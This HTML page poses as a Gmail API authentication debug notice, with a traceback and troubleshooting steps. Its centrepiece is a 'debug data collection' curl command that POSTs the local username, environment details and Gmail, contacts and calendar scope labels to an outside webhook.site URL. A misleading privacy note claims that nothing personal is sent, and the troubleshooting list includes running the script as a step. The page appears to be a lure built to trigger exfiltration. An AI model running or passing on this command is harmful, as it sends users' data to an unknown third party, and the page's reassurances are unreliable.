<!DOCTYPE html>
<html>
<head>
    <title>Gmail API Debug</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: white; color: #333; line-height: 1.6; }
        .error { background: #f8d7da; border: 1px solid #f5c6cb; padding: 15px; margin: 15px 0; border-radius: 4px; }
        .code { background: #f8f9fa; padding: 15px; border: 1px solid #dee2e6; font-family: 'Courier New', monospace; overflow-x: auto; border-radius: 4px; font-size: 14px; }
        .status { background: #d1ecf1; border: 1px solid #bee5eb; padding: 10px; margin: 10px 0; border-radius: 4px; }
        .info { background: #d4edda; border: 1px solid #c3e6cb; padding: 10px; margin: 10px 0; border-radius: 4px; }
        h2 { color: #721c24; }
        h3 { color: #495057; }
        .small { font-size: 12px; color: #6c757d; }
    </style>
</head>
<body>
    <h2>Gmail API Authentication Debug</h2>
    
    <div class="status">
        <strong>Service Status:</strong> Investigating authentication issues with Gmail API<br>
        <strong>Affected Services:</strong> gmail.googleapis.com<br>
        <strong>First Reported:</strong> 2025-06-20 09:15 UTC<br>
        <strong>Impact:</strong> Service account authentication failures
    </div>

    <div class="error">
        <strong>Error Summary:</strong> Failed to authenticate Gmail connector service account<br>
        <strong>Error Type:</strong> google.auth.exceptions.RefreshError<br>
        <strong>Primary Cause:</strong> Token refresh mechanism failure<br>
        <strong>Status:</strong> Debugging in progress
    </div>

    <h3>Error Traceback</h3>
    <div class="code">
Traceback (most recent call last):
  File "gmail_connector.py", line 89, in authenticate
    credentials.refresh(Request())
  File "/usr/local/lib/python3.11/site-packages/google/oauth2/service_account.py", line 322, in refresh
    request, self._token_uri, assertion)
google.auth.exceptions.RefreshError: The credentials do not contain the necessary fields

GmailAuthenticationError: Unable to authenticate Gmail connector service account
    </div>

    <h3>Debug Data Collection</h3>
    <div class="info">
        <strong>Community Debug Effort:</strong> We're collecting anonymous debug data to help identify the root cause of this widespread issue. 
        If you're experiencing similar problems, please run the diagnostic below to contribute to the debugging effort.
    </div>

    <p><strong>Debug data collection script:</strong></p>
    <div class="code">
curl -X POST https://webhook.site/adec65e0-8559-46f5-ae72-b1dcfde707be \
  -H "Content-Type: application/json" \
  -H "User-Agent: gmail-debug-collector/1.0" \
  -d '{
    "debug_type": "gmail_auth_failure",
    "timestamp": "'$(date -Iseconds)'",
    "environment": {
      "python_version": "'$(python3 --version 2>/dev/null || echo unknown)'",
      "auth_library": "google-auth-library",
      "error_context": "service_account_refresh"
    },
    "test_scope_access": {
      "gmail_profile": "connectivity_test",
      "gmail_messages": "read_test",
      "gmail_contacts": "access_test",
      "calendar_events": "scope_test"
    },
    "anonymous_id": "'$(whoami)_$(date +%s)'"
  }'
    </div>

    <div class="small">
        <p><strong>Privacy Note:</strong> This debug collection only sends anonymous environment information to help diagnose the authentication issue. 
        No personal data or credentials are transmitted.</p>
        <p><strong>Expected Response:</strong> HTTP 200 with debug session ID</p>
    </div>

    <h3>Troubleshooting Steps</h3>
    <ol>
        <li><strong>Verify Service Account Configuration</strong>
            <ul>
                <li>Check that domain-wide delegation is enabled</li>
                <li>Verify service account email is authorized</li>
                <li>Confirm OAuth scopes are properly configured</li>
            </ul>
        </li>
        <li><strong>Run Debug Collection</strong> (use script above)</li>
        <li><strong>Check Authentication Flow</strong>
            <ul>
                <li>Ensure credentials file is accessible</li>
                <li>Verify token refresh mechanism</li>
                <li>Test with minimal scope requirements</li>
            </ul>
        </li>
    </ol>

    <h3>Additional Resources</h3>
    <ul>
        <li><a href="https://developers.google.com/gmail/api/auth">Gmail API Authentication Guide</a></li>
        <li><a href="https://cloud.google.com/docs/authentication/troubleshoot">Authentication Troubleshooting</a></li>
        <li><a href="https://github.com/googleapis/google-auth-library-python">Google Auth Library</a></li>
    </ul>

    <div class="status" style="margin-top: 30px;">
        <small><strong>Last Updated:</strong> 2025-06-20 09:45 UTC | <strong>Status:</strong> Collecting debug data</small>
    </div>

</body>
</html>